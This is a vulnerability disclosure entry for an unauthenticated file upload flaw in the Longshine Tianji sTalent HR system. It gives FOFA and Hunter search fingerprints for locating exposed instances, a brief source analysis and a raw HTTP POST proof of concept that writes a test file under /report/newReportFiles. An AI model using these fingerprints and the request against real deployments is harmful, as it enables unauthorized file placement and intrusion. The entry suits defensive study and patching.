---
title: Longshine Tianji sTalent Front-End File Upload
---

# Longshine Tianji sTalent Front-End File Upload

## Vulnerable Vendor

Beijing Longshine Tianji Software Technology Co., Ltd.

## Vendor Website

http://www.hrsoft.com.cn/  

## Product

sTalent system

## Fingerprints

**FOFA**

```
"/js/Comm/loadingsmall.js" && icon_hash="1772087922"
```

**Hunter**

```
web.body="/js/Comm/loadingsmall.js" && web.icon=="4859e39ae6c0f1f428f2126a6bb32bd9"
```

Vulnerable URL: `/api/Report/SaveNewReport`

Vulnerability analysis:

Deobfuscate the `Web.Api.dll` file to obtain the source code. The application uses an MVC structure.

The `SaveNewReport` method under the `Web.Api.Controllers.Report` class has a file upload vulnerability.

Because authentication exists, a comment needs to be added to the method.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624183117550.png)

The condition here is satisfied, and the `SaveAs` method is called on the `httpPostedFile` object.

The storage path is under `/report\\newReportFiles`.

## POC

```
POST /api/Report/SaveNewReport?rptId=1 HTTP/1.1
Host: x.x.x.x
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=qreedyvzmub5afo1nba2i22d
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxzpiOaIdFLPXG0zW
Content-Length: 177 

------WebKitFormBoundaryxzpiOaIdFLPXG0zW
Content-Disposition: form-data; name="file";filename="1.txt"
Content-Type: image

111
------WebKitFormBoundaryxzpiOaIdFLPXG0zW—
```

File path:

`/report/newReportFiles/1_1.txt`

`report/newReportFiles/{rptId}_filename`

The path in newer versions is: `/api/Report/Report/SaveNewReport`

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624183400986.png)
